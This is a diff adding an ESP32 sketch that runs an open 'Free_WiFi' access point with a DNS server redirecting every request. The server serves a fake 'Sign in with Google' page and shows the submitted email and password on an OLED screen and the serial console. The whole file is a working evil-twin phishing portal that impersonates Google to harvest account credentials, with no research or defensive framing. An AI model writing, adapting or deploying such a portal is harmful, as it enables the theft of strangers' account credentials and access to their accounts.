@@ -1,0 +1,190 @@
+#include <WiFi.h>
+#include <WebServer.h>
+#include <DNSServer.h>
+#include <U8g2lib.h>
+#include <Wire.h>
+
+// OLED display configuration (0.96" 128x64 I2C)
+U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2(U8G2_R0, /* reset=*/ U8X8_PIN_NONE);
+
+// WiFi configuration
+const char* AP_SSID = "Free_WiFi";
+const char* AP_PASSWORD = "";  // Empty for open network
+
+// DNS server
+const byte DNS_PORT = 53;
+DNSServer dnsServer;
+
+// Web server
+WebServer server(80);
+
+// Captive portal HTML
+const char INDEX_HTML[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Sign in with Google</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f0f0; }
+.login-container { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 400px; width: 90%; }
+h1 { color: #333; font-size: 24px; margin-bottom: 20px; }
+input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+button { background: #4285f4; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; width: 100%; font-size: 16px; }
+button:hover { background: #357abd; }
+</style>
+</head>
+<body>
+<div class="login-container">
+<h1>Sign in with Google</h1>
+<form action="/login" method="POST">
+<input type="text" name="email" placeholder="Email" required>
+<input type="password" name="password" placeholder="Password" required>
+<button type="submit">Next</button>
+</form>
+</div>
+</body>
+</html>
+)rawliteral";
+
+// Success page
+const char SUCCESS_HTML[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Success</title>
+<style>
+body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f0f0; }
+.success { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
+h1 { color: #4CAF50; }
+</style>
+</head>
+<body>
+<div class="success">
+<h1>Success!</h1>
+<p>You have been logged in.</p>
+</div>
+</body>
+</html>
+)rawliteral";
+
+// OLED display functions
+void displayMessage(const char* line1, const char* line2 = "", const char* line3 = "", const char* line4 = "") {
+  u8g2.clearBuffer();
+  u8g2.setFont(u8g2_font_6x10_tf);
+  
+  u8g2.drawStr(0, 10, line1);
+  if (strlen(line2) > 0) u8g2.drawStr(0, 25, line2);
+  if (strlen(line3) > 0) u8g2.drawStr(0, 40, line3);
+  if (strlen(line4) > 0) u8g2.drawStr(0, 55, line4);
+  
+  u8g2.sendBuffer();
+}
+
+void displayCredentials(const String& email, const String& password) {
+  u8g2.clearBuffer();
+  u8g2.setFont(u8g2_font_6x10_tf);
+  
+  u8g2.drawStr(0, 10, "Credentials Captured!");
+  u8g2.drawStr(0, 25, "Email:");
+  
+  // Display email (truncate if too long)
+  String emailDisplay = email;
+  if (emailDisplay.length() > 20) {
+    emailDisplay = emailDisplay.substring(0, 20) + "...";
+  }
+  u8g2.drawStr(0, 35, emailDisplay.c_str());
+  
+  u8g2.drawStr(0, 50, "Password:");
+  
+  // Display password (truncate if too long)
+  String passDisplay = password;
+  if (passDisplay.length() > 20) {
+    passDisplay = passDisplay.substring(0, 20) + "...";
+  }
+  u8g2.drawStr(0, 60, passDisplay.c_str());
+  
+  u8g2.sendBuffer();
+}
+
+void setup() {
+  Serial.begin(115200);
+  Serial.println("Starting...");
+  
+  // Initialize OLED
+  u8g2.begin();
+  u8g2.clearBuffer();
+  u8g2.setFont(u8g2_font_6x10_tf);
+  u8g2.drawStr(0, 10, "Starting...");
+  u8g2.sendBuffer();
+  
+  // Setup WiFi AP
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP(AP_SSID, AP_PASSWORD);
+  delay(100);
+  
+  IPAddress myIP = WiFi.softAPIP();
+  Serial.print("AP IP address: ");
+  Serial.println(myIP);
+  
+  // Setup DNS server
+  dnsServer.start(DNS_PORT, "*", myIP);
+  
+  // Setup web server routes
+  server.on("/", HTTP_GET, []() {
+    server.send(200, "text/html", INDEX_HTML);
+  });
+  
+  server.on("/login", HTTP_POST, []() {
+    String email = server.arg("email");
+    String password = server.arg("password");
+    
+    // Display credentials on OLED
+    displayCredentials(email, password);
+    
+    // Print to serial for debugging
+    Serial.println("=== Credentials Captured ===");
+    Serial.print("Email: ");
+    Serial.println(email);
+    Serial.print("Password: ");
+    Serial.println(password);
+    Serial.println("===========================");
+    
+    // Send success page
+    server.send(200, "text/html", SUCCESS_HTML);
+  });
+  
+  // Redirect all other requests to the login page
+  server.onNotFound([]() {
+    server.send(200, "text/html", INDEX_HTML);
+  });
+  
+  server.begin();
+  
+  // Display initial status on OLED
+  u8g2.clearBuffer();
+  u8g2.setFont(u8g2_font_6x10_tf);
+  u8g2.drawStr(0, 10, "Captive Portal");
+  
+  // Display AP name
+  String apLine = "AP: ";
+  apLine += AP_SSID;
+  u8g2.drawStr(0, 25, apLine.c_str());
+  
+  // Display IP
+  String ipLine = "IP: ";
+  ipLine += myIP.toString();
+  u8g2.drawStr(0, 40, ipLine.c_str());
+  
+  u8g2.drawStr(0, 55, "Waiting for login...");
+  u8g2.sendBuffer();
+  
+  Serial.println("HTTP server started");
+}
+
+void loop() {
+  dnsServer.processNextRequest();
+  server.handleClient();
+}
